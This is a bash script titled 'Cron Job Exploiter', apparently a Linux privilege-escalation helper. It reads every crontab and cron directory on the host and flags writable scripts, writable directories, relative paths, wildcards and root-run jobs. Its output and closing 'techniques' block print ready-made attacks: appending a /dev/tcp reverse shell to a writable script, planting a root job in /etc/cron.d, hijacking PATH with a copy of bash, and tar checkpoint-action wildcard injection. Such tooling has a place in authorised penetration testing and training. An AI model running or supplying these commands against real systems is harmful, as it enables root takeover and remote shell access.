#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           CRON JOB EXPLOITER            ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

output_dir="/tmp/cron_analysis_$$"
mkdir -p "$output_dir"

echo -e "\n${BLUE}[+] Analyzing system crontab${NC}"
if [ -f /etc/crontab ]; then
    echo -e "${GREEN}=== /etc/crontab ===${NC}"
    cat /etc/crontab | tee "$output_dir/crontab.txt"
fi

echo -e "\n${BLUE}[+] Scanning cron directories${NC}"
cron_dirs=("/etc/cron.d" "/etc/cron.hourly" "/etc/cron.daily" "/etc/cron.weekly" "/etc/cron.monthly")

for dir in "${cron_dirs[@]}"; do
    if [ -d "$dir" ]; then
        echo -e "${YELLOW}=== Directory: $dir ===${NC}"
        ls -la "$dir" | tee -a "$output_dir/cron_dirs.txt"
        
        for file in "$dir"/*; do
            if [ -f "$file" ]; then
                echo -e "\n${GREEN}File: $file${NC}"
                cat "$file" | tee -a "$output_dir/cron_files.txt"
            fi
        done
    fi
done

echo -e "\n${BLUE}[+] Checking user crontabs${NC}"
for user_dir in /home/*; do
    if [ -d "$user_dir" ]; then
        user=$(basename "$user_dir")
        echo -e "${YELLOW}=== User: $user ===${NC}"
        
        if [ -f "$user_dir/.crontab" ]; then
            echo -e "${GREEN}Found .crontab${NC}"
            cat "$user_dir/.crontab" | tee -a "$output_dir/user_crons.txt"
        fi
        
        if [ -f "$user_dir/.cron" ]; then
            echo -e "${GREEN}Found .cron${NC}"
            cat "$user_dir/.cron" | tee -a "$output_dir/user_crons.txt"
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking system crontabs (for all users)${NC}"
if [ -d /var/spool/cron ]; then
    echo -e "${GREEN}=== /var/spool/cron ===${NC}"
    ls -la /var/spool/cron | tee -a "$output_dir/spool_cron.txt"
    
    for file in /var/spool/cron/*; do
        if [ -f "$file" ]; then
            echo -e "\n${GREEN}File: $file${NC}"
            cat "$file" | tee -a "$output_dir/user_crons.txt"
        fi
    done
fi

echo -e "\n${BLUE}[+] Checking anacron jobs${NC}"
if [ -f /etc/anacrontab ]; then
    echo -e "${GREEN}=== /etc/anacrontab ===${NC}"
    cat /etc/anacrontab | tee -a "$output_dir/anacron.txt"
fi

echo -e "\n${BLUE}[+] Checking for writable cron scripts${NC}"
echo -e "${YELLOW}Looking for scripts in cron directories that we can write${NC}"

for dir in "${cron_dirs[@]}"; do
    if [ -d "$dir" ]; then
        for file in "$dir"/*; do
            if [ -f "$file" ] && [ -w "$file" ]; then
                echo -e "${RED}[!] WRITABLE: $file${NC}"
                echo -e "${GREEN}    Exploit: Add reverse shell to the script${NC}"
                echo -e "${GREEN}    Example: echo 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1' >> $file${NC}"
            fi
        done
    fi
done

echo -e "\n${BLUE}[+] Checking for writable cron directories${NC}"
for dir in "${cron_dirs[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        echo -e "${RED}[!] WRITABLE: $dir${NC}"
        echo -e "${GREEN}    Exploit: Create new cron job${NC}"
        echo -e "${GREEN}    Create file: echo '* * * * * root /tmp/malicious.sh' > $dir/00exploit${NC}"
    fi
done

echo -e "\n${BLUE}[+] Checking for absolute vs relative paths${NC}"
echo -e "${YELLOW}Jobs using relative paths may be exploitable via PATH manipulation${NC}"

cat "$output_dir/crontab.txt" "$output_dir/cron_files.txt" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read -r line; do
    if echo "$line" | grep -qE "/[a-zA-Z0-9]"; then
        if echo "$line" | grep -vqE "^[0-9\*/,\-]+\s+[0-9\*/,\-]+\s+[0-9\*/,\-]+\s+[0-9\*/,\-]+\s+[0-9\*/,\-]+\s+.*\s+/\s*"; then
            echo -e "${RED}[!] Possible relative path: $line${NC}"
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking for jobs using wildcards${NC}"
echo -e "${YELLOW}Wildcard usage can lead to argument injection${NC}"

grep -r "\*" /etc/cron* "$output_dir/cron_files.txt" 2>/dev/null | grep -v "^#" | while read -r line; do
    if echo "$line" | grep -qE "(\s|^)\*.*\s+.*\*"; then
        echo -e "${YELLOW}Wildcard job: $line${NC}"
    fi
done

echo -e "\n${BLUE}[+] Checking for jobs that run as root${NC}"
grep -r "root" /etc/crontab /etc/cron.d/* 2>/dev/null | while read -r line; do
    echo -e "${GREEN}$line${NC}"
done | tee -a "$output_dir/root_crons.txt"

echo -e "\n${BLUE}[+] Checking for script permissions${NC}"
echo -e "${YELLOW}Scripts that are executable and writable${NC}"

for dir in "${cron_dirs[@]}"; do
    if [ -d "$dir" ]; then
        find "$dir" -type f -executable 2>/dev/null | while read -r file; do
            if [ -w "$file" ]; then
                echo -e "${RED}[!] WRITABLE & EXECUTABLE: $file${NC}"
                ls -la "$file"
            fi
        done
    fi
done

echo -e "\n${BLUE}[+] Checking for scripts in user-writable locations${NC}"
grep -rhE "(/home/|/tmp/|/var/tmp/)" /etc/crontab /etc/cron.d/* 2>/dev/null | while read -r line; do
    echo -e "${YELLOW}User-writable location in cron: $line${NC}"
done

echo -e "\n${BLUE}[+] Cron exploitation techniques${NC}"

cat << 'EOF'
1. If script is writable:
   - Add reverse shell: echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> script

2. If cron directory is writable:
   - Create new job: echo '* * * * * root /tmp/malicious.sh' > /etc/cron.d/00exploit

3. If script uses relative paths:
   - Create malicious binary in PATH: cp /bin/bash /tmp/ls; export PATH=/tmp:$PATH

4. If script uses wildcards with tar:
   - Create files to exploit: touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=/bin/bash'

5. If logrotate is used:
   - Check for writable config files
EOF

echo -e "\n${GREEN}[+] Cron analysis complete${NC}"
echo -e "${YELLOW}Results saved to: $output_dir${NC}"
echo -e "${YELLOW}Files created:${NC}"
ls -lh "$output_dir"
